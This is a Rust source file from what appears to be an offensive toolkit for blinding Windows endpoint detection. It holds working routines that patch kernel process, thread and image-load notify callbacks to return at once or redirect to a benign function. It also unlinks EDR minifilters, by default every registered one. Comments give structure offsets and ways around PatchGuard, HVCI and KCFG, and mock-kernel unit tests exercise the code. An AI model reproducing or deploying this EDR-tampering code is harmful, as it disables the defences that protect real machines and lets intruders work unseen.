//! Kernel telemetry neutralization kits — REAL algorithms (P2.2 §2.2/§2.3).
//!
//! - [`CallbackNeutralizer`] (`CallbackKit`): enumerate Ps/Ob/Cm callback arrays
//!   and overwrite each occupied slot's function pointer with a `ret`-only stub.
//!   HVCI-relevant (code write into a kernel stub region) — see the trait's
//!   HVCI note.
//! - [`MiniFilterUnlinker`] (`MiniFilterKit`): walk the fltmgr `RegisteredFilters`
//!   list and unlink an EDR's minifilter. HVCI-safe (data-section LIST_ENTRY).
//!
//! Both are algorithms over a `&dyn KernelRw`; the bootstrap (the `KernelRw`
//! impl + symbol resolution) is supplied by the operator. Unit-tested with a
//! mock KernelRw; never run against a live kernel on this host.

use crate::offsets::{flt, notify_routines, RuntimeOffsets};
use crate::{CallbackKit, KernelRw, KitError, MiniFilterKit};

// ---- §2.2 CallbackKit -----------------------------------------------------

/// A `ret`-only stub the neutralizer writes over each callback's function
/// pointer. On x64, `C3` (near RET) is 1 byte; but a callback slot stores a
/// full pointer to the routine, so we overwrite the routine's *entry bytes*
/// with `[C3]` (ret) — making the callback fire but return immediately. (We
/// do NOT null the slot: PatchGuard bugchecks on null Ps*NotifyRoutine entries.
/// Overwriting the routine's code with a ret is the KCFG-safe alternative
/// because the routine is real code in a real module, not a forged address.)
///
/// **HVCI note:** writing into a callback routine's `.text` is a CODE-page
/// write — HVCI-on hosts refuse it (`KrwError::HvciCodePage`). The
/// `repurpose` variant (point at a legitimate-looking redirect) is the
/// HVCI-safe alternative and is preferred on HVCI-on hosts.
pub const RET_STUB: [u8; 1] = [0xC3];

/// Real CallbackKit impl. Holds the **runtime-resolved** KVAs of the three
/// Ps*NotifyRoutine arrays (these drift across 17763 UBRs by ~0x8000 bytes,
/// so they MUST come from a bootstrap symbol/pattern resolution, never a
/// hardcoded RVA). The bootstrap fills a [`RuntimeOffsets`] and the kit
/// consumes it.
pub struct CallbackNeutralizer {
    pub runtime: RuntimeOffsets,
}

/// Which notify-routine array to neutralize.
#[derive(Clone, Copy)]
pub enum NotifyArray {
    CreateProcess,
    CreateThread,
    LoadImage,
}

impl CallbackNeutralizer {
    fn array_kva(&self, array: NotifyArray) -> Result<usize, KitError> {
        let kva = match array {
            NotifyArray::CreateProcess => self.runtime.create_process_notify_array_kva,
            NotifyArray::CreateThread => self.runtime.create_thread_notify_array_kva,
            NotifyArray::LoadImage => self.runtime.load_image_notify_array_kva,
        };
        if kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "notify-routine array KVA unresolved — bootstrap must fill RuntimeOffsets",
            ));
        }
        Ok(kva)
    }

    /// Neutralize one Ps*NotifyRoutine array in place. For each occupied slot:
    ///   1. unpack the real callback-context pointer (clear low 3 bits),
    ///   2. read the function pointer at +0x00 of the context block,
    ///   3. overwrite the function's entry byte with `ret` (0xC3).
    /// Returns the count of slots neutralized.
    ///
    /// **Selective targeting (slot-0 / ntoskrnl skip):** slot[0] of each
    /// Ps*NotifyRoutine array is the nt! internal dispatcher. Overwriting its
    /// CODE with `ret` is a `.text` write that trips PatchGuard and bugchecks
    /// the host (this is the dangerous code-write path — more certain to
    /// triple-fault than `repurpose`'s data write). We skip it using the same
    /// logic as `repurpose`: range-based ntoskrnl filtering when bounds are
    /// resolved, else the slot[0] fallback.
    ///
    /// # Safety contract (caller)
    /// The array KVAs in [`Self::runtime`] must be the live, runtime-resolved
    /// addresses (these drift across 17763 UBRs — a hardcoded RVA is a BSOD);
    /// the KernelRw must be a real kernel primitive. HVCI-on: code-page writes
    /// will return Err and the caller should fall back to `repurpose`.
    fn neutralize_array(&self, krw: &dyn KernelRw, array: NotifyArray) -> Result<usize, KitError> {
        let base = self.array_kva(array)?;
        let mut count = 0usize;
        // Range-based ntoskrnl filtering: skip any slot whose routine address
        // falls inside the ntoskrnl image (nt! internal dispatchers —
        // overwriting their CODE causes system instability and PatchGuard
        // detection). When both bounds are 0 (bootstrap didn't resolve them),
        // fall back to skipping only slot[0], the known dispatcher position.
        let skip_ntoskrnl =
            self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
        for i in 0..notify_routines::ARRAY_LEN {
            let slot_kva = base + i * 8;
            let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
            if !notify_routines::is_occupied(packed) {
                continue;
            }
            let ctx = notify_routines::unpack(packed) as usize;
            if ctx == 0 {
                continue;
            }
            // The callback-context block's first QWORD is the routine address
            // (EX_RUNDOWN_REF-packed in some builds; we clear low bits defensively).
            let routine = krw.kread_u64(ctx).map_err(KitError::from)?;
            let routine = (routine & notify_routines::PTR_MASK) as usize;
            if routine == 0 {
                continue;
            }
            // Sanity: the routine must be in the kernel code range
            // (0xFFFF8000_00000000 .. 0xFFFF_FFFF_FFFF_FFFF). Writing to a
            // non-code address is a triple-fault (BSOD). Guard against
            // corrupted ctx blocks or layout mismatches that feed us a data
            // address or a user-mode VA.
            if routine < 0xFFFF_8000_0000_0000 {
                continue;
            }
            // Skip ntoskrnl internal dispatchers — overwriting their CODE with
            // `ret` causes system instability, PatchGuard detection, and a
            // near-certain bugcheck (this is the .text write path). Same logic
            // as `repurpose`.
            if skip_ntoskrnl {
                // Range-based: skip if routine falls inside the ntoskrnl image.
                if routine >= self.runtime.ntoskrnl_base
                    && routine < self.runtime.ntoskrnl_base + self.runtime.ntoskrnl_size
                {
                    continue;
                }
            } else {
                // Fallback: skip only slot[0], the known dispatcher position.
                if i == 0 {
                    continue;
                }
            }
            // Overwrite the routine's first byte with `ret`. CODE page write —
            // HVCI may refuse; surface the error so the caller can repurpose.
            krw.kwrite(routine, &RET_STUB).map_err(KitError::from)?;
            count += 1;
        }
        Ok(count)
    }
}

impl CallbackKit for CallbackNeutralizer {
    fn neutralize(&self, krw: &dyn KernelRw) -> Result<usize, KitError> {
        let mut total = 0usize;
        total += self.neutralize_array(krw, NotifyArray::CreateProcess)?;
        total += self.neutralize_array(krw, NotifyArray::CreateThread)?;
        total += self.neutralize_array(krw, NotifyArray::LoadImage)?;
        Ok(total)
    }

    fn repurpose(&self, krw: &dyn KernelRw, redirect: usize) -> Result<(), KitError> {
        // HVCI-safe alternative to neutralize: instead of overwriting the
        // callback routine's CODE with 0xC3 (CODE-page write → blocked by
        // HVCI), we overwrite the callback-context's *routine pointer* with
        // `redirect` — a benign nt! function. This is a DATA write (the
        // callback-context block lives in non-paged pool), so HVCI allows it.
        //
        // The chosen `redirect` must be KCFG-valid (a real function entry in
        // a kernel module). Typical candidates: nt!ExpRegionFaultTunnel or
        // any benign nt! stub that returns immediately.
        //
        // **Selective targeting:** slot[0] of each Ps*NotifyRoutine array is
        // the nt! internal dispatcher — overwriting it causes system instability
        // and PatchGuard detection. We skip it. All other slots are fair game
        // provided their context pointer and routine address pass validation.
        let mut total = 0usize;
        for array in [
            NotifyArray::CreateProcess,
            NotifyArray::CreateThread,
            NotifyArray::LoadImage,
        ] {
            let base = self.array_kva(array)?;
            for i in 0..notify_routines::ARRAY_LEN {
                // Selective targeting: skip callback slots whose routine pointer
                // falls inside the ntoskrnl image (nt! internal dispatchers —
                // overwriting them causes system instability and PatchGuard
                // detection).
                //
                // When `ntoskrnl_base` + `ntoskrnl_size` are resolved, use
                // range-based filtering: skip any slot whose routine address
                // falls in [ntoskrnl_base, ntoskrnl_base + ntoskrnl_size).
                // This catches the slot-0 dispatcher AND any other nt! internal
                // callbacks at any slot position.
                //
                // Fallback (both == 0): skip only slot[0], the known
                // dispatcher position. This preserves backward compatibility
                // when the bootstrap hasn't resolved ntoskrnl bounds.
                let skip_ntoskrnl =
                    self.runtime.ntoskrnl_base != 0 && self.runtime.ntoskrnl_size != 0;
                let slot_kva = base + i * 8;
                let packed = krw.kread_u64(slot_kva).map_err(KitError::from)?;
                if !notify_routines::is_occupied(packed) {
                    continue;
                }
                let ctx = notify_routines::unpack(packed) as usize;
                if ctx == 0 {
                    continue;
                }
                // ctx must be a canonical kernel address — writing to a
                // user-mode or non-canonical address is a triple-fault (BSOD).
                if ctx < 0xFFFF_8000_0000_0000 {
                    continue;
                }
                // The callback-context block's first QWORD is the routine
                // address. Validate it's a real kernel pointer before overwriting.
                let routine = krw.kread_u64(ctx).map_err(KitError::from)?;
                let routine = (routine & notify_routines::PTR_MASK) as usize;
                if routine < 0xFFFF_8000_0000_0000 {
                    continue;
                }
                // Skip ntoskrnl internal dispatchers — overwriting them causes
                // system instability and PatchGuard detection.
                if skip_ntoskrnl {
                    // Range-based: skip if routine falls inside the ntoskrnl image.
                    if routine >= self.runtime.ntoskrnl_base
                        && routine < self.runtime.ntoskrnl_base + self.runtime.ntoskrnl_size
                    {
                        continue;
                    }
                } else {
                    // Fallback: skip only slot[0], the known dispatcher position.
                    if i == 0 {
                        continue;
                    }
                }
                // DATA write: overwrite the routine pointer in the context block.
                // HVCI-safe (non-paged pool data section, not code).
                krw.kwrite_u64(ctx, redirect as u64)
                    .map_err(KitError::from)?;
                total += 1;
            }
        }
        let _ = total;
        Ok(())
    }
}

// ---- §2.3 MiniFilterKit ---------------------------------------------------

/// Real MiniFilterKit: walks `FLTMGR!FltGlobals → FrameList → RegisteredFilters`
/// and unlinks the entry whose `_FLT_FILTER` matches `target_filter_name`. The
/// unlink is a data-section LIST_ENTRY edit (HVCI-safe).
///
/// The operator supplies the FltGlobals KVA (resolved via fltmgr symbol lookup
/// or a pattern scan). Each step's offset comes from [`crate::offsets::flt`].
pub struct MiniFilterUnlinker {
    /// Kernel VA of `FLTMGR!FltGlobals`.
    pub flt_globals_kva: usize,
}

impl MiniFilterUnlinker {
    /// Unlink the minifilter at `filter_kva` from its RegisteredFilters list.
    /// Pure LIST_ENTRY unlink: `entry.Blink.Flink = entry.Flink;
    /// entry.Flink.Blink = entry.Blink`. Data-only, HVCI-safe.
    ///
    /// `filter_kva` is the base of the `_FLT_FILTER`; its PrimaryLink is at
    /// `filter_kva + FLT_OBJECT_PRIMARY_LINK`. The caller (or a higher-level
    /// walk) supplies the resolved filter base.
    pub fn unlink_filter(&self, krw: &dyn KernelRw, filter_kva: usize) -> Result<(), KitError> {
        let link_kva = filter_kva + flt::FLT_OBJECT_PRIMARY_LINK;
        // Validate link_kva is a canonical kernel address before reading or
        // writing — a corrupted filter_base can produce a user-mode KVA.
        if link_kva < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "filter PrimaryLink is non-canonical — corrupted filter base",
            ));
        }
        // LIST_ENTRY { Flink: *mut, Blink: *mut } — read both.
        let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
        let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
        if flink < 0xFFFF_8000_0000_0000 || blink < 0xFFFF_8000_0000_0000 {
            return Err(KitError::UnsupportedPosture(
                "filter PrimaryLink is non-canonical — not in a list or already unlinked",
            ));
        }
        // blink->Flink = flink ; flink->Blink = blink
        krw.kwrite_u64(blink, flink as u64)
            .map_err(KitError::from)?;
        krw.kwrite_u64(flink + 8, blink as u64)
            .map_err(KitError::from)?;
        // Optionally self-loop the victim so a re-scan doesn't follow garbage.
        let _ = krw.kwrite_u64(link_kva, link_kva as u64);
        let _ = krw.kwrite_u64(link_kva + 8, link_kva as u64);
        Ok(())
    }
}

impl MiniFilterKit for MiniFilterUnlinker {
    /// Walk RegisteredFilters and unlink every entry (nuclear option: detaches
    /// ALL minifilters, including non-EDR ones). For surgical EDR-only detach,
    /// the operator resolves the target filter by name and calls
    /// [`unlink_filter`] directly.
    ///
    /// Walk chain (17763, EDRSandblast-verified offsets):
    ///   FltGlobals(base) → +GLOBALS_FRAME_LIST(0x58) [LIST_ENTRY head]
    ///     → Flink → _FLTP_FRAME → +FLTP_FRAME_REGISTERED_FILTERS(0x48) [LIST_ENTRY head]
    ///       → walk; each entry's CONTAINING_RECORD(-FLT_OBJECT_PRIMARY_LINK(0x10))
    ///         recovers the _FLT_FILTER base.
    fn detach_edr(&self, krw: &dyn KernelRw) -> Result<(), KitError> {
        // Step 1: FltGlobals → FrameList head → first frame.
        let frame_list_head = self.flt_globals_kva + flt::GLOBALS_FRAME_LIST;
        let first_frame_link = krw.kread_u64(frame_list_head).map_err(KitError::from)? as usize;
        if first_frame_link == 0 || first_frame_link == frame_list_head {
            return Err(KitError::UnsupportedPosture("FltGlobals FrameList empty"));
        }
        // The frame list entry is _FLTP_FRAME.Links (offset 0x8); recover the
        // frame base via CONTAINING_RECORD.
        let first_frame = first_frame_link.wrapping_sub(flt::FLTP_FRAME_LINKS);
        // Step 2: frame → RegisteredFilters head.
        let reg_filters_head = first_frame + flt::FLTP_FRAME_REGISTERED_FILTERS;
        let mut cur = krw.kread_u64(reg_filters_head).map_err(KitError::from)? as usize;
        let list_head = reg_filters_head;
        let mut unlinked = 0usize;
        // Walk until we circle back to the list head.
        while cur != 0 && cur != list_head && unlinked < 256 {
            // cur is a _FLT_OBJECT.PrimaryLink (offset 0x10 inside _FLT_FILTER).
            let filter_base = cur.wrapping_sub(flt::FLT_OBJECT_PRIMARY_LINK);
            // Capture next BEFORE unlinking (the unlink self-loops the victim).
            let next = krw.kread_u64(cur).map_err(KitError::from)? as usize;
            self.unlink_filter(krw, filter_base)?;
            unlinked += 1;
            cur = next;
        }
        if unlinked == 0 {
            return Err(KitError::NotFound);
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
        fn get_byte(&self, addr: usize) -> u8 {
            *self.0.lock().get(&addr).unwrap_or(&0)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }
    fn _assert_send_sync() {
        fn requires<T: KernelRw>(_: &T) {}
        let m = MockKrw::new();
        requires(&m);
    }

    #[test]
    fn neutralize_array_overwrites_occupied_routine_byte() {
        // Lay out a fake CreateProcess notify array with 2 occupied slots.
        let krw = MockKrw::new();
        let array_kva = 0x1000_0000usize; // the resolved array KVA (bootstrap-supplied)
        let ctx_a = 0x2000_1000usize;
        let ctx_b = 0x2000_2000usize;
        let routine_a = 0xFFFF_8000_0000_3000u64;
        let routine_b = 0xFFFF_8000_0000_4000u64;
        // slot 1 and slot 3 occupied (low bit set), the rest empty. We avoid
        // slot 0: without resolved ntoskrnl bounds the kit skips slot[0]
        // (the nt! dispatcher position) to avoid a PatchGuard bugcheck.
        krw.set_u64(array_kva + 1 * 8, ctx_a as u64 | 0x1);
        krw.set_u64(array_kva + 3 * 8, ctx_b as u64 | 0x1);
        // Each ctx's first QWORD = the routine address.
        krw.set_u64(ctx_a, routine_a);
        krw.set_u64(ctx_b, routine_b);

        let runtime = RuntimeOffsets {
            create_process_notify_array_kva: array_kva,
            ..Default::default()
        };
        let kit = CallbackNeutralizer { runtime };
        let n = kit
            .neutralize_array(&krw, NotifyArray::CreateProcess)
            .unwrap();
        assert_eq!(n, 2);
        // Both routines' first byte is now 0xC3.
        assert_eq!(krw.get_byte(routine_a as usize), 0xC3);
        assert_eq!(krw.get_byte(routine_b as usize), 0xC3);
    }

    #[test]
    fn neutralize_skips_empty_and_null_slots() {
        let krw = MockKrw::new();
        let array_kva = 0x1000_0000usize;
        // slot 1 occupied, slot 2 empty (0), slot 3 has ptr but no low bit.
        // (We use slot 1 rather than slot 0 because the slot-0 dispatcher
        // is skipped to avoid a PatchGuard bugcheck.)
        krw.set_u64(array_kva + 1 * 8, 0x2000 as u64 | 0x1);
        krw.set_u64(array_kva + 3 * 8, 0x3000 as u64); // no low bit
                                                       // Phase 1.1: routine address must be in kernel VA range (≥0xFFFF_8000_0000_0000)
        krw.set_u64(0x2000, 0xFFFF_8000_0000_5000);

        let runtime = RuntimeOffsets {
            create_process_notify_array_kva: array_kva,
            ..Default::default()
        };
        let kit = CallbackNeutralizer { runtime };
        let n = kit
            .neutralize_array(&krw, NotifyArray::CreateProcess)
            .unwrap();
        assert_eq!(n, 1); // only slot 1
        assert_eq!(krw.get_byte(0xFFFF_8000_0000_5000), 0xC3);
    }

    /// slot[0] (the nt! dispatcher) MUST be skipped on the dangerous code-write
    /// path: overwriting its `.text` trips PatchGuard and bugchecks the host.
    /// This test entrenches that slot-0 is never neutralized.
    #[test]
    fn neutralize_skips_slot_zero_dispatcher() {
        let krw = MockKrw::new();
        let array_kva = 0x1000_0000usize;
        let ctx = 0x2000_1000usize;
        let routine = 0xFFFF_8000_0000_3000u64;
        // Only slot 0 is occupied — without ntoskrnl bounds the kit skips it.
        krw.set_u64(array_kva + 0 * 8, ctx as u64 | 0x1);
        krw.set_u64(ctx, routine);

        let runtime = RuntimeOffsets {
            create_process_notify_array_kva: array_kva,
            ..Default::default()
        };
        let kit = CallbackNeutralizer { runtime };
        let n = kit
            .neutralize_array(&krw, NotifyArray::CreateProcess)
            .unwrap();
        assert_eq!(n, 0); // slot 0 skipped — nothing neutralized
        // The routine's entry byte is untouched.
        assert_eq!(krw.get_byte(routine as usize), 0x0);
    }

    /// With resolved ntoskrnl bounds, the range-based filter skips any routine
    /// that falls inside the ntoskrnl image (not just slot 0).
    #[test]
    fn neutralize_skips_routines_inside_ntoskrnl_bounds() {
        let krw = MockKrw::new();
        let array_kva = 0x1000_0000usize;
        let nt_base = 0xFFFF_F800_0000_0000usize;
        let nt_size = 0x0040_0000usize; // 4 MiB
        let ctx_inside = 0x2000_1000usize;
        let ctx_outside = 0x2000_2000usize;
        // routine_inside falls inside [nt_base, nt_base + nt_size).
        let routine_inside = (nt_base + 0x1000) as u64;
        // routine_outside is in kernel range but outside ntoskrnl.
        let routine_outside = 0xFFFF_8000_0000_4000u64;
        krw.set_u64(array_kva + 1 * 8, ctx_inside as u64 | 0x1);
        krw.set_u64(array_kva + 2 * 8, ctx_outside as u64 | 0x1);
        krw.set_u64(ctx_inside, routine_inside);
        krw.set_u64(ctx_outside, routine_outside);

        let runtime = RuntimeOffsets {
            create_process_notify_array_kva: array_kva,
            ntoskrnl_base: nt_base,
            ntoskrnl_size: nt_size,
            ..Default::default()
        };
        let kit = CallbackNeutralizer { runtime };
        let n = kit
            .neutralize_array(&krw, NotifyArray::CreateProcess)
            .unwrap();
        assert_eq!(n, 1); // only the outside routine
        // The ntoskrnl-internal routine is untouched.
        assert_eq!(krw.get_byte(routine_inside as usize), 0x0);
        assert_eq!(krw.get_byte(routine_outside as usize), 0xC3);
    }

    #[test]
    fn neutralize_errors_when_array_unresolved() {
        // If the bootstrap didn't resolve the array KVA (0), the kit MUST
        // refuse rather than read/write garbage at address 0.
        let krw = MockKrw::new();
        let kit = CallbackNeutralizer {
            runtime: RuntimeOffsets::default(),
        };
        let r = kit.neutralize_array(&krw, NotifyArray::CreateProcess);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn minifilter_unlink_relinks_neighbours() {
        let krw = MockKrw::new();
        // Use kernel-canonical addresses (>= 0xFFFF_8000_0000_0000) — the
        // production guard rejects user-space-range pointers as non-canonical.
        const KBASE: usize = 0xFFFF_8000_0000_0000;
        // Build: head <-> A (filter) <-> B (filter) <-> head
        let head = KBASE + 0x1000;
        let filter_a = KBASE + 0x2000;
        let filter_b = KBASE + 0x3000;
        let link_a = filter_a + flt::FLT_OBJECT_PRIMARY_LINK;
        let link_b = filter_b + flt::FLT_OBJECT_PRIMARY_LINK;
        // head.Flink = link_a, head.Blink = link_b
        krw.set_u64(head, link_a as u64);
        krw.set_u64(head + 8, link_b as u64);
        // A.Flink = link_b, A.Blink = head
        krw.set_u64(link_a, link_b as u64);
        krw.set_u64(link_a + 8, head as u64);
        // B.Flink = head, B.Blink = link_a
        krw.set_u64(link_b, head as u64);
        krw.set_u64(link_b + 8, link_a as u64);

        let kit = MiniFilterUnlinker { flt_globals_kva: 0 }; // unused for unlink_filter
        kit.unlink_filter(&krw, filter_a).unwrap();
        // After unlinking A: head.Flink should = link_b, head.Blink = link_b.
        assert_eq!(krw.get_u64(head), link_b as u64);
        assert_eq!(krw.get_u64(head + 8), link_b as u64);
        // B.Blink should = head.
        assert_eq!(krw.get_u64(link_b + 8), head as u64);
    }
}
